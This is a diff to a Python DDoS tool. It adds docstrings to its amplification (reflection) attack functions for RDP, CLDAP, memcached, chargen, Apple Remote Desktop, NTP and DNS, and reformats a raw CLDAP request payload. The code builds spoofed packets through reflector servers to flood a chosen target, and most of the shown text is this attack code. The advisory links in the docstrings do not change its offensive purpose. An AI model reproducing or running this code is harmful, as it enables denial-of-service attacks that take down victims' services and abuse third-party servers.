@@ -587,8 +587,11 @@ def ampl_packets_gen(reflectors: List[str], target: Target, payload: bytes, ampl
 
 
 async def RDP(ctx: Context, fid: int, target: Target):
-    """
+    """Leverages Windows RDP servers to launch amplication attack.
+
     Layer: L4.
+
+    Requires list of reflection servers to be provided.
     """
     packets = ampl_packets_gen(
         ctx.reflectors,
@@ -600,22 +603,34 @@ async def RDP(ctx: Context, fid: int, target: Target):
 
 
 async def CLDAP(ctx: Context, fid: int, target: Target):
-    """
+    """Amplication (reflection) attack against Connection-less Lightweight
+    Directory Access Protocol (CLDAP). More information and analysis:
+    https://www.akamai.com/our-thinking/threat-advisories/cldap-reflection-ddos
+
     Layer: L4.
+
+    Requires list of reflection servers to be provided.
     """
     packets = ampl_packets_gen(
         ctx.reflectors,
         target,
-        (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
-         b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00'),
+        b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
+        b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
         389
     )
     await flood_ampl_packates_gen(ctx, fid, target, packets)
 
 
 async def MEMCACHE(ctx: Context, fid: int, target: Target):
-    """
+    """Amplification (reflection) attack against memcached protocol. Protocol spec:
+    https://github.com/memcached/memcached/blob/master/doc/protocol.txt
+
+    Attack vector analysis:
+    https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/
+
     Layer: L4.
+
+    Requires list of reflection servers to be provided.
     """
     packets = ampl_packets_gen(
         ctx.reflectors,
@@ -629,14 +644,20 @@ async def MEMCACHE(ctx: Context, fid: int, target: Target):
 async def CHAR(ctx: Context, fid: int, target: Target):
     """
     Layer: L4.
+
+    Requires list of reflection servers to be provided.
     """
     packets = ampl_packets_gen(ctx.reflectors, target, b'\x01', 19)
     await flood_ampl_packates_gen(ctx, fid, target, packets)
 
 
 async def ARD(ctx: Context, fid: int, target: Target):
-    """
+    """Leverages MacOS Apple Remote Desktop (ARD) service to launche
+    amplification (reflection) attack.
+
     Layer: L4.
+
+    Requires list of reflection servers to be provided.
     """
     packets = ampl_packets_gen(
         ctx.reflectors,
@@ -648,8 +669,12 @@ async def ARD(ctx: Context, fid: int, target: Target):
 
 
 async def NTP(ctx: Context, fid: int, target: Target):
-    """
+    """NTP amplification (reflection) attack. More info:
+    https://www.cisa.gov/uscert/ncas/alerts/TA14-013A
+
     Layer: L4.
+
+    Requires list of reflection servers to be provided.
     """
     packets = ampl_packets_gen(
         ctx.reflectors,
@@ -661,8 +686,12 @@ async def NTP(ctx: Context, fid: int, target: Target):
 
 
 async def DNS(ctx: Context, fid: int, target: Target):
-    """
+    """DNS amplification (reflection) attack. More info:
+    https://www.cisa.gov/uscert/ncas/alerts/TA13-088A
+    
     Layer: L4.
+
+    Requires list of reflection servers to be provided.
     """
     packets = ampl_packets_gen(
         ctx.reflectors,
